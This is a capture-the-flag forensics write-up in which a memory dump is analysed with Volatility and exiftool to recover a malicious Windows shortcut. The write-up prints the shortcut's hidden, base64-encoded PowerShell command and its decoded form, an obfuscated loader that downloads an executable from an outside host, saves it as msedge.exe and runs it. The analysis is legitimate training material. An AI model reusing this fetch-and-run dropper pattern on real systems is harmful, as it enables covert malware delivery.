# Forensic - Surveillance_of_sus
Solved by **warlocksmurf**\
Original writeup by **warlocksmurf** - https://warlocksmurf.github.io/posts/wanictf2024/

## Question
A PC is showing suspicious activity, possibly controlled by a malicious individual. It seems a cache file from this PC has been retrieved. Please investigate it!

## Solution
Look for the `unknown file` in common locations in Windows environment and note that it is located in **Downloads** folder with its `lnk` file in **Desktop**.

```
└─$ python3 vol.py -f ~/Desktop/shared/WaniCTF/chal_mem_search.DUMP windows.filescan | grep -E 'Desktop|Downloads|Documents'
---SNIP---
0xcd88ceba67e0  \Users\Public\Desktop\Microsoft Edge.lnk        216
0xcd88cebac730  \Users\Mikka\Desktop    216
0xcd88cebae1c0  \Users\Mikka\Downloads\read_this_as_admin.download      216
0xcd88cebc26c0  \Users\Mikka\Desktop\read_this_as_admin.lnknload        216
0xcd88cebc3660  \Users\Public\Desktop   216
---SNIP---
```

By dumping and analysing it using `exiftool`, we can note there is a suspicious `CMD` command in it.
```
└─$ exiftool file.0xcd88cebc26c0.0xcd88ced4e5f0.DataSectionObject.read_this_as_admin.lnknload.dat 
ExifTool Version Number         : 12.76
. . . .
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32
Command Line Arguments          : -window hidden -noni -enc JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=
Icon File Name                  : C:\hack\shared\read_this.docx
Machine ID                      : desktop-8lr4rba
```

Decoding the command gives another obfuscated `Powershell` command.

```
└─$ echo "JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=" | base64 -d
$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
```

We just need to deobfuscate it until the end.

### Flag
`FLAG{Dayum_this_is_secret_file}`
